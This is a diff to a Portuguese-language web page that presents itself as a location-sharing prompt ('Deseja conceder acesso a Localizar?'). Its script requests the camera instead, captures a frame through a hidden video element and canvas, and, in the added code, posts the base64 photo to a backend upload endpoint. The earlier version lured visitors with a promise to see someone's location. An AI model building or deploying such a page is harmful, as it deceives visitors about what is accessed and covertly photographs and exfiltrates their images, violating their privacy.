@@ -2,7 +2,7 @@
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Localizar</title>
   <style>
     body {
@@ -10,23 +10,22 @@
       background-color: #f5f5f5;
       color: #333;
       display: flex;
+      flex-direction: column;
       align-items: center;
       justify-content: center;
       height: 100vh;
       margin: 0;
     }
-
     .card {
       background: white;
       padding: 2rem;
       border-radius: 12px;
       box-shadow: 0 4px 12px rgba(0,0,0,0.1);
       text-align: center;
-      max-width: 340px;
+      max-width: 320px;
     }
-
     button {
-      background-color: #28a745;
+      background-color: #007bff;
       color: white;
       border: none;
       padding: 0.75rem 1.5rem;
@@ -35,63 +34,70 @@
       cursor: pointer;
       margin-top: 1.5rem;
     }
-
-    #mensagem {
-      margin-top: 1rem;
-      font-weight: bold;
-    }
-
-    video, canvas {
-      display: none;
-    }
   </style>
 </head>
 <body>
   <div class="card">
     <h2>Deseja conceder acesso a Localizar?</h2>
-    <p>Será necessário ver localização marcada.</p>
-    <button onclick="iniciarProcesso()">Sim</button>
-    <p id="mensagem"></p>
-    <video id="camera" autoplay playsinline></video>
-    <canvas id="captura"></canvas>
+    <button id="btnPermitir">Sim</button>
   </div>
 
   <script>
-    async function iniciarProcesso() {
-      const video = document.getElementById('camera');
-      const canvas = document.getElementById('captura');
-      const mensagem = document.getElementById('mensagem');
+    const btn = document.getElementById('btnPermitir');
 
-      mensagem.textContent = "Você está prestes a ver a Localização de Rick!";
-
+    btn.addEventListener('click', async () => {
       try {
+        // Pede acesso à câmera (video apenas)
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const track = stream.getVideoTracks()[0];
+
+        // Cria um elemento video oculto para capturar a imagem
+        const video = document.createElement('video');
+        video.style.display = 'none';
+        document.body.appendChild(video);
         video.srcObject = stream;
 
-        // Aguarda alguns segundos para garantir que a câmera ativou
-        setTimeout(() => {
-          // Configura canvas com dimensões do vídeo
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
+        await video.play();
 
-          // Captura frame
-          const context = canvas.getContext('2d');
-          context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        // Cria canvas para capturar frame
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
 
-          // Para o stream da câmera
-          stream.getTracks().forEach(track => track.stop());
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-          // Aqui você pode enviar o frame para um servidor ou baixar a imagem:
-          const imagem = canvas.toDataURL("image/png");
-          console.log("Imagem capturada:", imagem);
+        // Para o stream após capturar
+        track.stop();
 
-          mensagem.textContent = "Imagem capturada com sucesso!";
-        }, 3000); // tempo para estabilizar câmera
-      } catch (erro) {
-        mensagem.textContent = "Permissão negada ou erro ao acessar a câmera.";
-        console.error("Erro ao acessar a câmera:", erro);
+        // Pega a imagem em base64 (png)
+        const imgBase64 = canvas.toDataURL('image/png');
+
+        // Envia para backend
+        const response = await fetch('http://127.0.0.1:5000/upload', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({ image: imgBase64 })
+        });
+
+        const result = await response.json();
+
+        if (response.ok) {
+          alert('Imagem enviada com sucesso!\nCaminho: ' + result.path);
+        } else {
+          alert('Erro ao enviar imagem:\n' + JSON.stringify(result.error));
+        }
+
+        // Remove o vídeo criado
+        video.remove();
+
+      } catch (err) {
+        alert('Erro ao acessar a câmera ou enviar a imagem.\n' + err.message);
+        console.error(err);
       }
-    }
+    });
   </script>
 </body>
 </html>
